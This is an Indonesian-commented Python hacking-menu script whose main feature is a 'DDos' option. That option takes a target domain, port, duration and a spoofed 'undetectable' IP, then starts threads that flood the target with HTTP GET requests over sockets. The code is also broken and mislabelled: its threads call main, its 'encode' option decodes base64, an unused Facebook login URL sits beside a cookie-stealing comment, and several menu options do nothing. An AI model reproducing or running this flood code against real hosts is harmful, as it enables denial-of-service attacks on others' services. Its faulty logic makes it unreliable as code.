import os
import sys
import time
import socket
import threading
import requests
from bs4 import BeautifulSoup
import base64
import binascii

# warnanya masbro 
merah = "\033[31m"  # merah
MERAH = "\033[1;31m"  # MERAH ++
abang = "\033[38;5;1m"
putih = "\033[1;97m"  # putih
biru = "\033[34m"  # dark blue 
BIRU = "\033[94m"  # biru terang
hijau = "\033[32m"  # hijau
HIJAU = "\033[1;32m" # hijau ++
kuning = "\033[33m"  # kuning ++
KUNING = "\033[1;33m"  # kuning
ungu = "\033[35m"  # ungu ++
UNGU = "\033[1;35m"  # ungu ++

# berikan nilai default agar gak mbeleber
x = "\033[0m"  # default

url = "https://www.facebook.com/login.php"
p_sambut = "Welcome to script adiy"
tr = "Terimaksih telah menggunakan script adiy"
disk = ""

# taimer

def waktu(milisecond):
    while milisecond:
        # runing second
        mins, secs = divmod(milisecond, 60) # 60 mili
        timer = f"{mins:02d}:{secs:02d}" # mm:ss
        print(f"\r{timer}", end='')
        time.sleep(1) # delay 1 detik
        milisecond -= 1 # setipa loop kurangi 1 detik
        # print("\n") # biyar gak bentrok

def main():
    os.system("clear")
    # os.system("cls") # opsional tergantung update di mana

    print(f'{putih}WELLCOME BOLO DI SC ADIYZD\n')
    print(f"""
    {abang}░█████╗░██████╗░██╗██╗░░░██╗███████╗██████╗░
    {abang}██╔══██╗██╔══██╗██║╚██╗░██╔╝╚════██║██╔══██╗
    {abang}███████║██║░░██║██║░╚████╔╝░░░███╔═╝██║░░██║
    {putih}██╔══██║██║░░██║██║░░╚██╔╝░░██╔══╝░░██║░░██║
    {putih}██║░░██║██████╔╝██║░░░██║░░░███████╗██████╔╝
    {putih}╚═╝░░╚═╝╚═════╝░╚═╝░░░╚═╝░░░╚══════╝╚═════╝░  
    {x}
    """)
    print(f"{BIRU} 1. Serangan DDos")
    print(f"{BIRU} 2. Amankan password akun")
    print(f"{BIRU} 3. Dekode password")
    print(f"{BIRU} 4. Dekode dokumen")
    print(f"{BIRU} 5. Encode ")
    print(f"{abang} 00. OUT!")

    # interaksi user 1
    print(f"{KUNING} WARNING {x} {putih}Pastikan pilihan anda benar!{x}")
    i_user_1 = input(f"{putih} Masukan pilihan anda dengan benar : {x}")

    #=================> bagian get cookies facebook <=================#
    if i_user_1 == "1":
        time.sleep(00.03)
        os.system("clear")
        print(f"{putih} Silahkan masukan Domain dan port yang dituju")
        print(f"{KUNING} Pastikan Pengetesan di lakukan dengan ijin! {putih}(ADIYDDOS){x}")
        print(f"{putih}GASSS <=|==========> {x}")

        # gass ddos 
        try:
            print(f" {abang}[!] {x}{biru} Harap masukan url tanpa ('https://')")
            url = str(input(f"{abang}Masukan url target : {HIJAU}"))
            port = input(f"{abang} Masukan port yang ingin di tuju : {HIJAU}")
            durasi = int(input(f"{putih} Masukan seberapa lama anda ingin ddos :"))
            ip2 = input(f"{putih}Masukan ip anda agar gak keditek :{HIJAU} ")
            print(f"{x}")

            try:
                IP = socket.gethostbyname(url)
                print(f"{abang}Url target adalah : {HIJAU}https://{url}")
                print(f"{abang}ip target nya adalah : {HIJAU}{IP}")
            
            # interaksi 
            except socket.gaierror:
                print(f"{x} Url tidak valid url: https://{url} IP: {IP}")

            # batasan treas
            max = 9999
            gas = threading.Semaphore(max)

            def ddos():
                while True:
                    try:
                        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        s.connect((IP, port))
                        s.sendto(("GET /:" + IP + "HTTP/1.1\r\n").encode('ascii'), (IP, port))
                        s.sendto(("Host: " + ip2 + "\r\n\r\n").encode('ascii'), (IP, port))
                        s.close()
                    # berhentikan
                    except Exception as e:
                        print(f"Error: {e}")
                        time.sleep(10)
                        os.system("clear")
            for i in range(durasi):
                thr = threading.Thread(target=main)
                thr.start()

                waktu(320)

        except:
            print(f"Error periksa lagi waktu \r{waktu(10)}")
            

             
    #=================> bagian encode <=================#
    elif i_user_1 == "2":
        print(f"{KUNING} Warning : {x} {putih} Password bersifat privasi jadi ingat dengan benar!")
        print(f"{putih} Silahkan masukan password yang ingin anda encode {x}")
        print(f"{KUNING} Harus bersifat string{x}")

        user_encode = input(f"{putih} Silahkan masukan text yang ingin anda encode : {x}")
        print(f"{putih} Proses encode : ")
        # print(f"{waktu(10)}")

        # gass encode 

        e_di = base64.b64decode(user_encode.encode('utf-8'))
        di_encode = e_di.decode('utf-8')

        print(f"{HIJAU} Password berhasil di encode : {x} \n ", di_encode)


    else:
        os.system("clear")
        print(f"{abang} Pilihan tidak ada / tidak valid !{x}")
        print(f"{time.sleep(3)}{main()}")


if __name__ == "__main__":
    main()